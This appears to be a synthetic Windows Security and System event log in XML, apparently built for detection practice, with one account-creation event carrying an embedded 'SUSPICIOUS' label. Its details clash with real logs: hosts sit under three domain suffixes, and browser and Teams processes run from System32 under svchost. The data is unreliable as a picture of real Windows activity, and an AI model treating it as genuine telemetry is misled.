<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{7500C4DB-0D49-175F-AECB-EFA7ABF1CD76}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.669Z'/><EventRecordID>629090</EventRecordID><Channel>Security</Channel><Computer>SRV-DB01.hq.internal</Computer></System><EventData><Data Name='TargetUserName'>loliveira</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='TargetLogonId'>0x21370</Data><Data Name='LogonType'>3</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{BCFB16D7-8B12-8AEF-FE64-FC98467DA567}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.285Z'/><EventRecordID>964346</EventRecordID><Channel>Security</Channel><Computer>WKS-PC003.hq.internal</Computer></System><EventData><Data Name='SubjectUserName'>cpereira</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0xDBFA4</Data><Data Name='NewProcessName'>C:\Windows\System32\SearchIndexer.exe</Data><Data Name='ProcessId'>5343</Data><Data Name='CommandLine'>SearchIndexer.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{794BA175-0833-167B-9841-DC92BBF60F25}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.792Z'/><EventRecordID>651961</EventRecordID><Channel>System</Channel><Computer>WKS-PC002.hq.internal</Computer></System><EventData><Data Name='param1'>DHCP Client</Data><Data Name='param2'>running</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{138ACD00-EB1C-91DD-AEBD-336D8BA27B41}'/><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>Logon</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.541Z'/><EventRecordID>180705</EventRecordID><Channel>Security</Channel><Computer>SRV-WEB01.hq.internal</Computer></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>SRV-APP01$</Data><Data Name='SubjectDomainName'>EMPRESA</Data><Data Name='SubjectLogonId'>0xCB059</Data><Data Name='TargetUserSid'>S-1-5-21-9291702-7263</Data><Data Name='TargetUserName'>acosta</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='TargetLogonId'>0x93EB0</Data><Data Name='LogonType'>3</Data><Data Name='IpAddress'>10.0.1.50</Data><Data Name='IpPort'>62919</Data><Data Name='WorkstationName'>SRV-APP01</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{67F406A2-A182-7F20-5F3A-4294E6334D29}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.595Z'/><EventRecordID>158918</EventRecordID><Channel>Security</Channel><Computer>WKS-NB010.hq.internal</Computer></System><EventData><Data Name='SubjectUserName'>mrocha</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0x5F80F</Data><Data Name='NewProcessName'>C:\Windows\System32\explorer.exe</Data><Data Name='ProcessId'>1285</Data><Data Name='CommandLine'>explorer.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{83474628-4A5F-8F1A-7D5E-159054755796}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.415Z'/><EventRecordID>663028</EventRecordID><Channel>Security</Channel><Computer>SRV-WEB01.hq.internal</Computer></System><EventData><Data Name='SubjectUserName'>nalmeida</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0xE31F9</Data><Data Name='NewProcessName'>C:\Windows\System32\taskhostw.exe</Data><Data Name='ProcessId'>8826</Data><Data Name='CommandLine'>taskhostw.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{8C1DA0C3-554E-2238-E0E6-233C8691B80A}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.143Z'/><EventRecordID>868907</EventRecordID><Channel>System</Channel><Computer>SRV-DB01.corp.local</Computer></System><EventData><Data Name='param1'>Windows Firewall</Data><Data Name='param2'>stopped</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{68375902-5A4B-ACE9-E604-65568A6AFCA7}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.528Z'/><EventRecordID>272441</EventRecordID><Channel>Security</Channel><Computer>SRV-DC02.empresa.local</Computer></System><EventData><Data Name='SubjectUserName'>psouza</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0x7C2BC</Data><Data Name='NewProcessName'>C:\Windows\System32\chrome.exe</Data><Data Name='ProcessId'>1461</Data><Data Name='CommandLine'>chrome.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{CC407645-595D-F427-EFE6-8CE0AE18D359}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.854Z'/><EventRecordID>883487</EventRecordID><Channel>System</Channel><Computer>SRV-EXCH01.empresa.local</Computer></System><EventData><Data Name='param1'>DNS Client</Data><Data Name='param2'>stopped</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{77263878-E5E8-4022-27A3-04C2D7CC39E1}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.109Z'/><EventRecordID>519910</EventRecordID><Channel>System</Channel><Computer>SRV-DC02.hq.internal</Computer></System><EventData><Data Name='param1'>Windows Firewall</Data><Data Name='param2'>stopped</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{84793BAC-04A5-5CD5-5763-0CA30C5885BA}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.366Z'/><EventRecordID>479204</EventRecordID><Channel>Security</Channel><Computer>WKS-PC001.hq.internal</Computer></System><EventData><Data Name='SubjectUserName'>mrocha</Data><Data Name='SubjectDomainName'>EMPRESA</Data><Data Name='SubjectLogonId'>0xBF476</Data><Data Name='NewProcessName'>C:\Windows\System32\teams.exe</Data><Data Name='ProcessId'>6146</Data><Data Name='CommandLine'>teams.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{537B3CFB-0407-458E-B332-217E7E711DA1}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.345Z'/><EventRecordID>778263</EventRecordID><Channel>Security</Channel><Computer>WKS-PC003.hq.internal</Computer></System><EventData><Data Name='SubjectUserName'>psouza</Data><Data Name='SubjectDomainName'>EMPRESA</Data><Data Name='SubjectLogonId'>0x30FE9</Data><Data Name='NewProcessName'>C:\Windows\System32\SearchIndexer.exe</Data><Data Name='ProcessId'>7760</Data><Data Name='CommandLine'>SearchIndexer.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{DB16873B-CA20-FA69-4720-F66F1E9C4F6D}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.423Z'/><EventRecordID>258696</EventRecordID><Channel>Security</Channel><Computer>WKS-NB010.corp.local</Computer></System><EventData><Data Name='SubjectUserName'>psouza</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0x51FFE</Data><Data Name='NewProcessName'>C:\Windows\System32\OneDrive.exe</Data><Data Name='ProcessId'>19668</Data><Data Name='CommandLine'>OneDrive.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{EC4FDDB3-6618-B07D-A716-38B62679AAB2}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.328Z'/><EventRecordID>644327</EventRecordID><Channel>Security</Channel><Computer>SRV-DC01.corp.local</Computer></System><EventData><Data Name='SubjectUserName'>dfreitas</Data><Data Name='SubjectDomainName'>EMPRESA</Data><Data Name='SubjectLogonId'>0xC4FF7</Data><Data Name='NewProcessName'>C:\Windows\System32\RuntimeBroker.exe</Data><Data Name='ProcessId'>4248</Data><Data Name='CommandLine'>RuntimeBroker.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{E761E9D9-7E22-E780-F090-C0875FB806C1}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.170Z'/><EventRecordID>665210</EventRecordID><Channel>Security</Channel><Computer>SRV-DB01.empresa.local</Computer></System><EventData><Data Name='SubjectUserName'>tlima</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='SubjectLogonId'>0x82133</Data><Data Name='NewProcessName'>C:\Windows\System32\SearchIndexer.exe</Data><Data Name='ProcessId'>4733</Data><Data Name='CommandLine'>SearchIndexer.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{3FE3BA54-350A-68E7-E682-0AFCC015160B}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.580Z'/><EventRecordID>568062</EventRecordID><Channel>Security</Channel><Computer>SRV-PRINT01.hq.internal</Computer></System><EventData><Data Name='SubjectUserName'>ggomes</Data><Data Name='SubjectDomainName'>EMPRESA</Data><Data Name='SubjectLogonId'>0x32D43</Data><Data Name='NewProcessName'>C:\Windows\System32\spoolsv.exe</Data><Data Name='ProcessId'>29314</Data><Data Name='CommandLine'>spoolsv.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{6132F528-E5F2-F716-07C4-969354E6EA38}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.342Z'/><EventRecordID>803284</EventRecordID><Channel>Security</Channel><Computer>SRV-PRINT01.empresa.local</Computer></System><EventData><Data Name='TargetUserName'>dfreitas</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='TargetLogonId'>0xEB037</Data><Data Name='LogonType'>7</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{3E665CAA-B8C6-5D38-1535-92F5570F5BC1}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.520Z'/><EventRecordID>904281</EventRecordID><Channel>Security</Channel><Computer>WKS-NB011.corp.local</Computer></System><EventData><Data Name='TargetUserName'>rsantos</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='TargetLogonId'>0x14868</Data><Data Name='LogonType'>7</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{086F955F-9354-FFAB-58AA-F6EBFD659086}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.081Z'/><EventRecordID>968693</EventRecordID><Channel>Security</Channel><Computer>WKS-PC001.corp.local</Computer></System><EventData><Data Name='TargetUserName'>tlima</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='TargetLogonId'>0x5FEFE</Data><Data Name='LogonType'>2</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{FFC73552-CF5E-941C-E41D-09F7C8D9D4E7}'/><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>Logon</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.457Z'/><EventRecordID>477018</EventRecordID><Channel>Security</Channel><Computer>SRV-EXCH01.corp.local</Computer></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>SRV-DC01$</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='SubjectLogonId'>0x97B5D</Data><Data Name='TargetUserSid'>S-1-5-21-9489628-2399</Data><Data Name='TargetUserName'>acastro</Data><Data Name='TargetDomainName'>CORP</Data><Data Name='TargetLogonId'>0x3BC9E</Data><Data Name='LogonType'>3</Data><Data Name='IpAddress'>192.168.1.200</Data><Data Name='IpPort'>58017</Data><Data Name='WorkstationName'>SRV-DC01</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{1012C767-C6C4-941A-BE17-2A7DF634BD19}'/><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>User Account Management</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.630Z'/><EventRecordID>918894</EventRecordID><Channel>Security</Channel><Computer>SRV-EXCH01.corp.local</Computer></System><EventData><Data Name='TargetUserName'>testadmin</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='SubjectUserName'>test</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0x2FC97</Data><!-- SUSPICIOUS: suspicious_account_creation — account 'testadmin' created by 'test' --></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{83B9ECDB-2941-4647-A9DC-DE7CF3E149AE}'/><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>Logon</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.400Z'/><EventRecordID>740640</EventRecordID><Channel>Security</Channel><Computer>SRV-EXCH01.corp.local</Computer></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>WKS-NB010$</Data><Data Name='SubjectDomainName'>EMPRESA</Data><Data Name='SubjectLogonId'>0xA023D</Data><Data Name='TargetUserSid'>S-1-5-21-3767472-6295</Data><Data Name='TargetUserName'>loliveira</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='TargetLogonId'>0xEE011</Data><Data Name='LogonType'>2</Data><Data Name='IpAddress'>10.0.1.25</Data><Data Name='IpPort'>55056</Data><Data Name='WorkstationName'>WKS-NB010</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{F7EB72F1-269C-4F84-863E-D617BE5B6B3D}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.807Z'/><EventRecordID>299612</EventRecordID><Channel>Security</Channel><Computer>WKS-NB010.hq.internal</Computer></System><EventData><Data Name='TargetUserName'>mrocha</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='TargetLogonId'>0x70A4D</Data><Data Name='LogonType'>3</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{F350EFA3-486C-FA09-591F-2DE2EA7F3829}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.458Z'/><EventRecordID>231404</EventRecordID><Channel>Security</Channel><Computer>WKS-PC003.empresa.local</Computer></System><EventData><Data Name='TargetUserName'>psouza</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='TargetLogonId'>0x1427D</Data><Data Name='LogonType'>7</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{64A67B78-B5E9-0E0F-8B17-0EDA83D72A4E}'/><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>Logon</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.357Z'/><EventRecordID>508198</EventRecordID><Channel>Security</Channel><Computer>SRV-FILE01.hq.internal</Computer></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>WKS-NB010$</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0xBF6BF</Data><Data Name='TargetUserSid'>S-1-5-21-7672549-3614</Data><Data Name='TargetUserName'>fmendes</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='TargetLogonId'>0xDBC06</Data><Data Name='LogonType'>7</Data><Data Name='IpAddress'>10.0.2.10</Data><Data Name='IpPort'>54290</Data><Data Name='WorkstationName'>WKS-NB010</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{488EEA9A-3AD0-C9FD-892A-F6DB1C518E46}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:12.197Z'/><EventRecordID>349693</EventRecordID><Channel>System</Channel><Computer>SRV-DB01.empresa.local</Computer></System><EventData><Data Name='param1'>Windows Update</Data><Data Name='param2'>stopped</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{FFBB9F93-76A8-A51C-F7DE-394FB006FF24}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.343Z'/><EventRecordID>247425</EventRecordID><Channel>System</Channel><Computer>WKS-PC001.hq.internal</Computer></System><EventData><Data Name='param1'>Windows Update</Data><Data Name='param2'>stopped</Data></EventData></Event>
